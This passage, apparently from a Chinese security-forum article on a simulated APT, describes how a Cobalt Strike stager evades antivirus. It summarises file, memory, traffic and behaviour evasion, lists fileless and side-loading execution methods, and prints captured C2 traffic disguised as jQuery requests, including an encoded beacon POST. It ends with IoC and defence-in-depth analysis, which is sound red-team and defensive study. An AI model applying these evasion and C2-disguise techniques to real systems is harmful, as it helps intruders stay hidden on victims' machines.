至此实现了完全免杀。我感觉可能是因为做到了以下几点：

*   逃避文件查杀：包含 payload 并编译 无明显的恶意特征
*   逃避内存查杀：stager 的 “渐进的内存申请方式” 注入 CS 的 shellcode + CS 的 shellcode 自身的内存免杀能力
*   逃避流量分析：流量上模拟 jQuery 难以发现恶意流量特征
*   逃避行为分析：指定运行条件 成功避免行为分析

其实还可以考虑其他免杀方法，如 给可执行文件做签名（无效的签名也可能有助于免杀）等诸多方法，看知识面、思路和能力了。

#### 免杀时效性

虽然现在是免杀状态，但我已经上传过样本了（就算我不上传可能一段时间后也可能作为可疑文件 “被上传”），所以安全人员拿到该文件样本、分析后确认为恶意程序，并把其 hash 作为 IoC，即可根据文件 hash 即可查杀、检测、防御该 stager 程序，免杀失效。

好在有该 stager 程序的源代码，可以实现 “源码级免杀”，对相关逻辑和可能的特征进行修改后，产生一个 “变种”，此时可能又实现了一段时间的文件免杀。  
这就是不断的对抗过程了。

#### 执行方式

本次测试，生成的是以启动可执行文件（.exe）的形式启动，其实还可以有其他执行方式：

*   可执行文件
    *   exe 执行 shellcode
    *   dll “白” 利用 - 用白名单程序 white.exe 加载 dll 执行 shellcode
    *   其他格式 (hta sct...)
*   无文件方式
    *   powershell
    *   cmd
    *   RegSvr.exe
    *   Mshta.exe
    *   WINWORD.EXE
    *   Rundll32.exe
    *   word 宏 结合社工技巧启动宏功能
    *   ...

### 本次威胁的 IoC

总体上来说，恶意特征不明显。  
因为这次只是模拟攻击，所以从攻击者角度自我分析一波，看看自己的 “马脚”。

#### 流量 IoC

因为这次只是模拟攻击，所以可直接从 CS 主控端的 Reporting 按钮导出文件 indicatorsofcompromise.docx（见附件），其中说明了本次模拟攻击中的 IoC（入侵指标）和该威胁的恶意流量特征，通常可以据此写出该威胁的检测规则，以便于 NIDS（Network Intrusion Detection System）能够从流量上检测威胁。

实际上，只看到以下信息。

Domains and IP Addresses  
The following domains and IP addresses were attributed to this actor.  
10.211.55.5

可见流量上的 IoC 很单一，只有 C2 的 ip 地址 10.211.55.5

> 至于 HTTP 流量 (见附件) 和 提取的关键字（"jQuery"），我认为无法定义恶意流量特征。

个人认为从流量上难以检测。

#### 文件 IoC

生成的文件 17yes.exe 当然具有其对应 hash，但如果是针对某企业进行的攻击，该程序从未被捕获、分析，则该 hash 在渗透前到渗透中、渗透结束，可能未被分析发现它是恶意文件。

个人认为短时间内难以立即检测。

### 实测 - 流量分析

从防御者角度分析一下。  
在 victim 中使用 Wireshark 全程抓包（从打开文件前到常规远控操作），发现 C2 流量均为模拟 jQuery 的 http 协议的流量，极具隐蔽性。

使用过滤语法  
`ip.addr == 10.211.55.5 and http`  
可以看到 C2 流量是 web 流量（使用 HTTP 协议），分为 get 和 post（可以从 C2 配置文件看到定义）

[![](https://xzfile.aliyuncs.com/media/upload/picture/20190222180208-ea58f0f4-3688-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190222180208-ea58f0f4-3688-1.png)

具体看下。（可见附件 2 个文件 get.txt post.txt）

#### get 流量

get 请求：  
(请求中没有任何恶意流量特征)

```
GET /jquery-3.3.1.slim.min.js HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Host: cdn.bootcss.com
Referer: http://cdn.bootcss.com/
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
Connection: Keep-Alive
Cache-Control: no-cache
```

对应响应为：

```
HTTP/1.1 200 OK 
Content-Type: application/javascript; charset=utf-8
Date: Fri, 22 Feb 2019 07:44:21 GMT
Content-Length: 216490
Server: NetDNA-cache/2.2
Cache-Control: max-age=0, no-cache
Pragma: no-cache
Connection: keep-alive

/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */!function(e,t)
（编码了的C2控制信息）
return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});
```

该 get 请求的响应中有 恶意流量特征（"编码了的 C2 控制信息"），截图是这样的：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20190222180425-3bddb3f6-3689-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190222180425-3bddb3f6-3689-1.png)

#### post 流量

其中 post 流量为 victim 向主控端发送数据的流量。  
`ip.addr == 10.211.55.5 and http contains POST`

我将其中一次 post 请求与响应，保存到了附件，以供参考。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20190222180452-4bfd78d4-3689-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190222180452-4bfd78d4-3689-1.png)

Post 请求：

```
POST /jquery-3.3.2.min.js?__cfduid=CxuRMTktogA6 HTTP/1.1
Host: cdn.bootcss.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://cdn.bootcss.com/
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
Content-Length: 1995
Connection: Keep-Alive
Cache-Control: no-cache

（编码了的C2控制信息）
```

Post 请求 中有 恶意流量特征（ “编码了的 C2 控制信息 “），一条完整的信息是这样的：

```
WHAJWlhwDIpYcAlYWHAM9FhwCUsDI3ApLBVkeggCZjk9A3oHUUAAalIjcCksFWRTaHk9UCsdeil2FXE_UUQAaWxAAzkrAnopdhVxP1FEOGhRRD1iUgdgNDEeYC52FXE_UUQ4aFFEMGxSE3ooKwMnPyAVAG9oRABvaUYDLTEeZTU_H2d0PQhsU21APVNtRjFQKxV7LDETbCl2FXE_UUQwbFFGOW5SHHo7KwMnPyAVAG5hRgBsakADNisdJz8gFQBuYUYAbGpIAykuE2E1KwQnPyAVAGxoRABtakgDKS4TYTUrBCc_IBUAbGhEAGJtQgMpLhNhNSsEJz8gFQBsaEQAY2tGAykuE2E1KwQnPyAVAGxoRABjYEADKS4TYTUrBCc_IBUAbGhEAGtoQTtQKwZqMjcDfXQ9CGxTbkA9U2lAP2pSJ1weHjhmKSxebCI9eTBiaHk4a2BEAykuE2E1KwQnPyAVAGxoRABrakk7UCsAZjU0A390PQhsU25APVNpRTFqUgN_OTAfei52FXE_UUY5blFBP21uen07KxthNSsEJz8gFQBsaEQAa25IPVMgRj1TDzlHbQQcYDRRQQMpLhNhNSsEJz8gFQBsaEQAa29HP1A8B2R0PQhsU2FIOVNpRzFiUQg_blEnQBRvLGUzNnk4UD0IeTY3AmwodhVxP1FBPm5oeThib0YAIm5EAA0RPj4GNBlnU2l6XgwLI2oyPRR8Nj0CJz8gFQBsaEQAaGhAOVAeH3suMSNaFg4gRz45FWQ1Nl5sIj15P2pseTtrbEQDaW5ATT8rG301KDxgLj1GPXQ9CGxTaUg-bFFCO2tqeXFsbHleExZHVTYxHgBrUhNmMj0CbDQ7FSc_IBUAbGhEAGhqQz9QOx9hPyoVZzk9XmwiPXk7aGtGAGhqSTtQKAJlBSwfZjYrL3o_KgZgOT1ebCI9eT9qbHk7aWhAAzk3GGwoPR5qP3YVcT9RQjtjank7aWpIAyoqHFYuNx9lKXYVcT9RQjpqaHk7aWBEAyo7EXp0PQhsU25APVNqQzBsUhRlNjAfei52FXE_UUY5blFCPGpgelgLCAJmLj0TfXQ9CGxTbkA9U2pGO2pSAHs2BxNqdD0IbFNqQzFuUUI_aGB5cWxseV4TFkdVNjEeAGtSA2w5OhlzKSoGJz8gFQBsaEQAaG9HO1A8HGUyNwN9dD0IbFNuQD1Ta0Y8bFIjbDsqE2ETNhRsIj0CJz8gFQBsaEQAaW9CMVArBmoyNwN9dD0IbFNuQD1Ta0g6bFIDfzkwH3oudhVxP1FGOW5RQzFtanpkKTwEanQ9CGxTbkA9U2tCP2pSEWUzLwN6LHYVcT9RRDxoaHk9bGxAACJgRgANET4-BjQZZ1Npemo1NhhmKSxebCI9eTxrbnk9bGxIACJuRAANET4-BjQZZ1NpekEzKANNOz0dZjR2FXE_UUY5blFDP2luenwpIQNtMzkXJz8gFQBpbkM_U21EMW5SKmEvHB9nPR4RZz0BBSc_IBUAbGhEAGlsQT9QDxl7PysYaCgzXmwiPXk7aGlCAGltQjFTIEY9Uw85R20EHGA0UUEDOTUUJz8gFQBrYEc_U2tAOVMgRj1TDzlHbQQcYDRRQQM5Nx5hNSsEJz8gFQBvaUYAa2hJO1MgRj1TDzlHbQQcYDRRQQNpbkB9KDkJJz8gFQBobkg5U21EPW5SI2Y8LD1uKBQZfT92FXE_UUU9bmx5O2NoQAMSMQB6DioRcHQ9CGxTa0U_blFFPmJgeXFibnleExZHVTYxHgBrUhR8NygTaCp2FXE_UUM8aGB5P2hoQAAibkQADRE-PgY0GWdTaXpqNTYYZiksXmwiPXk8a255PWlsRAAibkQADRE-PgY0GWdTaXo4bQcJbCl2FXE_UUI7a2p5P2trRgAiYEYADRE-PgY0GWdTaXpFMy4VXCo8EX0_a0Y5dD0IbFNtRD1uUUQ7bGh6CVpgqEVpOMq-aezpBykqzR3Y2qyQHet-wfs
```

对应响应为：  
(响应中没有任何恶意流量特征)

```
HTTP/1.1 200 OK 
Content-Type: application/javascript; charset=utf-8
Date: Fri, 22 Feb 2019 07:46:02 GMT
Server: NetDNA-cache/2.2
Cache-Control: max-age=0, no-cache
Pragma: no-cache
Connection: keep-alive
Content-Length: 5543

/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */!function(e,t){"use strict";"object"==typeof module&&"object"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error("jQuery requires a window with a document");return t(e)}:t(e)}("undefined"!=typeof window?window:this,function(e,t){"use strict";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return"function"==typeof t&&"number"!=typeof t.nodeType},y=function e(t){return null!=t&&t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement("script");if(o.text=e,n)for(i in v)n[i]&&(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+"":"object"==typeof e||"function"==typeof e?l[c.call(e)]||"object":typeof e}var b="3.3.1",w=function(e,t){return new w.fn.init(e,t)},T=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;w.fn=w.prototype={jquery:"3.3.1",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for("boolean"==typeof a&&(l=a,a=arguments[s]||{},s++),"object"==typeof a||g(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&&(l&&r&&(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&&Array.isArray(n)?n:[]):o=n&&w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},w.extend({expando:"jQuery"+("3.3.1"+Math.random()).replace(/\D/g,""),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||"[object Object]"!==c.call(e))&&(!(t=i(e))||"function"==typeof(n=f.call(t,"constructor")&&t.constructor)&&p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?"":(e+"").replace(T,"")},makeArray:function(e,t){var n=t||[];return null!=e&&(C(Object(e))?w.merge(n,"string"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o<a;o++)(r=!t(e[o],o))!==s&&i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&s.push(i);return a.apply([],s)},guid:1,support:h}),"function"==typeof Symbol&&(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),function(e,t){l["[object "+t+"]"]=t.toLowerCase()});function C(e){var t=!!e&&"length"in e&&e.length,n=x(e);return!g(e)&&!y(e)&&("array"===n||0===t||"number"==typeof t&&t>0&&t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b="sizzle"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&&(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},P="
kjo9gg".(o=t.documentElement,Math.max(t.body["scroll"+e],o["scroll"+e],t.body["offset"+e],o["offset"+e],o["client"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,"**"):this.off(t,e||"**",n)}}),w.proxy=function(e,t){var n,r,i;if("string"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return("number"===t||"string"===t)&&!isNaN(e-parseFloat(e))},"function"==typeof define&&define.amd&&define("jquery",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});
```

### 建设企业网络的纵深防御体系

根据本次模拟攻击的全面免杀效果来看，想要在企业中发现到这类威胁确实具有一定难度。

那么企业如何发现、检测、防御这类高级威胁呢？

世界上不存在能 100% 发现 APT 的方法，但可以通过构建纵深防御体系，设置多种机制去发现、检测、防御甚至分析。  
以纵深防御的完善度、高可用性、持续有效性等，来增加威胁完全不被发现的难度。

如在环境中（办公网络、生产网络等）部署了多种检测防御方法：

*   主机
    *   办公终端 EDR agent: 反病毒 收集日志 威胁响应...
    *   服务器 HIDS agent
*   网络
    *   Snort
    *   NIDS/NIPS
*   日志集中存储分析
    *   SIEM 类 如 Splunk
*   APT 沙箱
    *   云端沙箱
*   WEB 防御
    *   WAF
*   SOC 系统
    *   安全运营人员的防御能力
*   蜜罐
*   UEBA(User and Entity Behavior Analytics) 用户和实体行为分析
*   ...

在纵深防御体系下，当高级威胁从进入企业网络到后续的后渗透行为（横向移动、暴力枚举等攻击流量、访问敏感系统、访问敏感主机堡垒机、访问敏感数据、出网...），整个过程中攻击者完全不会触发告警是极难的！

所以建设足够全面、高可用、持续有效的企业网络的纵深防御体系，非常有助于发现、检测和防御高级威胁攻击。

### 总结

本文通过模拟 APT 演示了高级威胁的全面免杀能力，并站在防御者角度思考如何发现、检测和防御高级威胁攻击，从而了解到攻防的对抗性，体会了企业建设纵深防御体系的重要性。

感谢阅读。